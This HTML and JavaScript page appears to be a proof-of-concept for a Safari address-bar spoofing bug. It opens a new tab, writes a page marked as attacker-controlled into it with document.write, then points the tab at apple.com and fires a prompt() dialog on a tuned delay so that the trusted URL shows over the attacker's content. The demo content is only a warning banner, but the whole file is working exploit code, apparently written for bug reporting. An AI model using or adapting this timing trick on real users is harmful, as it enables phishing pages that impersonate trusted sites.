<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, user-scalable=yes"
  />

  <title>Spoofing Test</title>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #fff;
      font-family: Arial, sans-serif;
    }

    .container {
      position: fixed;

      top: 50%;
      left: 50%;

      transform: translate(-50%, -50%);

      width: 90%;
      max-width: 850px;

      text-align: center;
    }

    #startBtn {
      padding: 15px 30px;

      font-size: 18px;
      font-weight: bold;

      background: #007aff;
      color: #fff;

      border: none;
      border-radius: 10px;

      cursor: pointer;
    }

    #attempt {
      font-size: 22px;
      font-weight: bold;

      margin-bottom: 25px;
    }

    #instruction {
      font-size: 22px;
      line-height: 1.6;

      margin-bottom: 30px;
    }

    #status {
      margin-top: 25px;

      font-size: 17px;
      color: #666;
    }

    .warning {
      margin-top: 25px;

      font-size: 15px;
      color: #888;
    }
  </style>
</head>


<body>

  <div class="container">

    <div id="attempt">
      Attempt 1 of 4
    </div>

    <div id="instruction">
      Click the button below to start the browser test.
    </div>

    <button id="startBtn">
      CLICK HERE
    </button>

    <div id="status"></div>

    <div class="warning">
      Browser UI testing — controlled test environment
    </div>

  </div>


<script>

const STORAGE_KEY =
  "spoof_test_attempt";


/*
 * ==========================================
 * GET CURRENT ATTEMPT
 * ==========================================
 */

function getAttempt() {

  return parseInt(
    localStorage.getItem(STORAGE_KEY) || "0",
    10
  );

}


/*
 * ==========================================
 * SAVE ATTEMPT
 * ==========================================
 */

function saveAttempt(attempt) {

  localStorage.setItem(
    STORAGE_KEY,
    String(attempt)
  );

}


/*
 * ==========================================
 * RESET TEST
 *
 * Run:
 *
 * resetTest()
 *
 * in Safari Web Inspector console.
 * ==========================================
 */

function resetTest() {

  localStorage.removeItem(
    STORAGE_KEY
  );

  location.reload();

}


/*
 * ==========================================
 * UPDATE PAGE UI
 * ==========================================
 */

function updateUI(attempt) {

  const attemptText =
    document.getElementById("attempt");

  const instruction =
    document.getElementById("instruction");

  const status =
    document.getElementById("status");


  /*
   * Initial state
   */

  if (attempt === 0) {

    attemptText.textContent =
      "Ready — Attempt 1 of 4";

    instruction.innerHTML =
      "Click the button below to start the browser test.";

    status.textContent = "";

    return;

  }


  /*
   * After attempt 1
   */

  if (attempt === 1) {

    attemptText.textContent =
      "Attempt 1 completed";

    instruction.innerHTML =
      `
      If the browser returned to this page:<br><br>

      <b>1.</b> Press the <b>Back</b> button.<br>
      <b>2.</b> Refresh this page.<br>
      <b>3.</b> Click <b>CLICK HERE</b> again.
      `;

    status.textContent =
      "Next: Attempt 2";

    return;

  }


  /*
   * After attempt 2
   */

  if (attempt === 2) {

    attemptText.textContent =
      "Attempt 2 completed";

    instruction.innerHTML =
      `
      Repeat the same procedure:<br><br>

      <b>1.</b> Press the <b>Back</b> button.<br>
      <b>2.</b> Refresh this page.<br>
      <b>3.</b> Click <b>CLICK HERE</b> again.
      `;

    status.textContent =
      "Next: Attempt 3";

    return;

  }


  /*
   * After attempt 3
   */

  if (attempt === 3) {

    attemptText.textContent =
      "Attempt 3 completed";

    instruction.innerHTML =
      `
      One more repetition is required.<br><br>

      <b>1.</b> Press the <b>Back</b> button.<br>
      <b>2.</b> Refresh this page.<br>
      <b>3.</b> Click <b>CLICK HERE</b> again.<br><br>

      <b>This will be Attempt 4.</b>
      `;

    status.textContent =
      "Final attempt ready";

    return;

  }


  /*
   * After attempt 4
   */

  if (attempt >= 4) {

    attemptText.textContent =
      "Test completed";

    instruction.innerHTML =
      `
      The final browser test has been triggered.
      `;

    status.textContent =
      "Attempt 4 executed.";

  }

}


/*
 * ==========================================
 * INITIALIZE PAGE
 * ==========================================
 */

let currentAttempt =
  getAttempt();

updateUI(currentAttempt);


/*
 * ==========================================
 * MAIN BUTTON
 * ==========================================
 */

document
  .getElementById("startBtn")
  .onclick = function () {


    /*
     * Increase counter
     */

    let attempt =
      getAttempt() + 1;


    /*
     * Limit to attempt 4
     */

    if (attempt > 4) {

      attempt = 4;

    }


    /*
     * Save counter
     */

    saveAttempt(attempt);


    /*
     * Remove button temporarily
     */

    this.remove();


    /*
     * ======================================
     * OPEN NEW TAB
     * ======================================
     */

    const newTab =
      window.open(
        "about:blank",
        "_blank"
      );


    if (!newTab) {

      alert(
        "Popup was blocked by Safari."
      );

      return;

    }


    /*
     * ======================================
     * ATTACKER-CONTROLLED CONTENT
     * ======================================
     *
     * This is intentionally the same
     * document.write() structure as
     * your original PoC.
     */

    newTab.document.write(`

      <!DOCTYPE html>

      <html>

      <head>

        <title>
          testertester
        </title>

      </head>


      <body
        style="
          margin:0;
          padding:0;
          background:#fff;

          display:flex;

          align-items:center;
          justify-content:center;

          min-height:100vh;

          text-align:center;
        "
      >

        <div>

          <h1
            style="
              font-size:96px;
              font-weight:bold;
              color:red;

              margin:0 0 30px 0;
            "
          >
            THIS IS NOT APPLE.COM!
          </h1>


          <i>

            <p
              style="
                font-size:64px;
                font-weight:bold;
                color:#007aff;

                margin:20px 0;
              "
            >
              *THIS IS ATTACKER CONTROLLED PAGE*
            </p>

          </i>


          <p
            style="
              font-size:24px;
              color:#555;
            "
          >
            Browser UI Test — Attempt ${attempt}
          </p>

        </div>

      </body>

      </html>

    `);


    newTab.document.close();


    /*
     * ======================================
     * NAVIGATION
     * ======================================
     *
     * The same navigation mechanism from
     * the original PoC.
     */

    setTimeout(() => {

      newTab.location.href =
        "https://apple.com";

    }, 1);


    /*
     * ======================================
     * DIALOG
     * ======================================
     *
     * Preserve the timing from your
     * original PoC.
     */

    setTimeout(() => {

      prompt(
        "ROOT CAUSE",
        "Browser UI Test — Attempt " + attempt
      );

    }, 300);

  };


/*
 * ==========================================
 * EXPOSE RESET FUNCTION
 * ==========================================
 */

window.resetTest =
  resetTest;

</script>

</body>
</html>
